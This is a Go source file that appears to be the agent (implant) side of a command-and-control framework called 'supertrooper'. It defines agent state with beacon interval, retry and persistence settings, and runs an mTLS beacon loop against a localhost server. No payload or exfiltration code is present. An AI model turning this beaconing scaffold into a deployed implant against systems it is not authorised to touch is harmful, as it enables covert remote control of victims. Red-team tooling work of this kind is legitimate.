package agent

import (
	"fmt"
	"log"
	"time"

	"github.com/google/uuid"
	"github.com/joe-broder15/supertrooper/internal/common"
)

type AgentState struct {
	Config        common.AgentConfig
	CompletedJobs []common.JobRsp
	PendingJobs   []common.JobReq
}

func NewAgentState() *AgentState {
	return &AgentState{
		Config: common.AgentConfig{
			AgentID:        uuid.New().String(),
			ServerAddr:     "https://localhost:443",
			BeaconInterval: 10,
			BeaconTries:    3,
			Persist:        false,
		},
		CompletedJobs: []common.JobRsp{},
		PendingJobs:   []common.JobReq{},
	}
}

// Start is the entry point for the agent. It initializes the state and
func Start(caCertPEM []byte, agentCertPEM []byte, agentKeyPEM []byte) error {

	// initialize AgentState
	state := NewAgentState()

	// Initialize the HTTPS client with mTLS
	client, err := NewHttpsClient(caCertPEM, agentCertPEM, agentKeyPEM)
	if err != nil {
		return fmt.Errorf("failed to start HTTPS client: %v}", err)
	}

	// set initial tries
	tries := state.Config.BeaconTries

	// main beacon loop. continue to beacon while we have not ran out of tries
	for tries > 0 {
		if response, err := SendBeaconReq(client, state); err != nil {
			log.Println(err)
			tries--
		} else {
			tries = state.Config.BeaconTries
			log.Println(response)
		}
		time.Sleep(time.Duration(state.Config.BeaconInterval) * time.Second)
	}

	return nil
}
